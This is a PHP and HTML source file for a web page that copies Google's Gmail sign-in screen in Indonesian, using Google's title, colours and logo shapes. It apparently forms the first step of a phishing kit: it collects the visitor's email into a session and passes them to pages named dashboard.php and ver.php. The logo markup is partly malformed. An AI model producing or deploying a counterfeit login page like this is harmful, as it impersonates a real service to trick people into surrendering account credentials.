<?php
session_start();

// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    
    // Add your validation and authentication logic here
    // This is just a basic example
    if (!empty($email)) {
        // Process login
        // You would typically validate credentials here
        $_SESSION['email'] = $email;
        // Redirect after successful login
        header("Location: dashboard.php");
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', Arial, sans-serif;
        }

        body {
            background-color: #f8f9fa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .container {
            flex-grow: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .login-card {
            background: white;
            padding: 48px 40px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            width: 450px;
        }

        .logo {
            margin-bottom: 24px;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 8px;
            font-weight: 400;
        }

        .subtitle {
            font-size: 16px;
            margin-bottom: 32px;
            color: #202124;
        }

        .form-group {
            margin-bottom: 32px;
        }

        input[type="text"] {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            margin-bottom: 8px;
        }

        input[type="text"]:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px #e8f0fe;
        }

        .forgot-email {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .guest-mode {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 32px;
        }

        .guest-mode a {
            color: #1a73e8;
            text-decoration: none;
            display: block;
            margin-top: 8px;
        }

        .button-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
        }

        .next-button {
            background: #1a73e8;
            color: white;
            padding: 8px 24px;
            border-radius: 4px;
            border: none;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }

        .next-button:hover {
            background: #1557b0;
        }

        footer {
            padding: 16px;
            display: flex;
            justify-content: space-between;
            background: #f8f9fa;
        }

        .language-select {
            padding: 8px;
            border: none;
            background: transparent;
            color: #5f6368;
            font-size: 12px;
        }

        .footer-links {
            display: flex;
            gap: 16px;
        }

        .footer-links a {
            color: #5f6368;
            text-decoration: none;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <div class="logo">
                <img src="g.ico" alt="" viewBox="0 0 75 24" width="20" height="20">
                    <g fill="none">
                        <path fill="#4285F4" d="M14.11 12c0-.82-.069-1.64-.2-2.45H7.39v4.63h3.81c-.17 1.01-.67 1.88-1.44 2.46v2.05h2.33c1.36-1.26 2.02-3.12 2.02-5.69z"/>
                        <path fill="#34A853" d="M7.39 14.7c-1.95 0-3.6-1.4-4.19-3.28H.87v2.12C2.11 16.37 4.53 18 7.39 18c1.92 0 3.53-.64 4.71-1.74l-2.33-1.81c-.64.43-1.47.69-2.38.69z"/>
                        <path fill="#FBBC05" d="M3.2 11.42c0-.95.35-1.82.92-2.47V6.83H1.79C.64 8.36 0 10.1 0 12c0 1.9.64 3.64 1.79 5.17l2.33-2.12c-.57-.65-.92-1.52-.92-2.47z"/>
                        <path fill="#EA4335" d="M7.39 5.28c1.09 0 2.07.37 2.84 1.11l2.07-2.07C11.05 3.09 9.44 2.4 7.39 2.4 4.53 2.4 2.11 4.03.87 6.83l2.33 1.81c.59-1.88 2.24-3.28 4.19-3.28z"/>
                    </g>
                </svg>
            </div>

            <h1>Login</h1>
            <p class="subtitle">Lanjutkan ke Gmail</p>

            <form method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Email atau nomor telepon" required>
                    <a href="#" class="forgot-email">Lupa email?</a>
                </div>

                <div class="guest-mode">
                    <p></p>
                    <a href="#"></a>
                    <br>
                    <br>
                </div>

                <div class="button-container">
                    <a href="#" class="create-account">Buat akun</a>
                    <button type="submit" class="next-button"><a href="ver.php" style="text-decoration: none !important;color : #ffffff
">Selanjutnya</a></button>
                </div>
            </form>
        </div>
    </div>

    <footer>
        <select class="language-select">
            <option value="id">Indonesia</option>
        </select>
        <div class="footer-links">
            <a href="#">Bantuan</a>
            <a href="#">Privasi</a>
            <a href="#">Persyaratan</a>
        </div>
    </footer>
</body>
</html>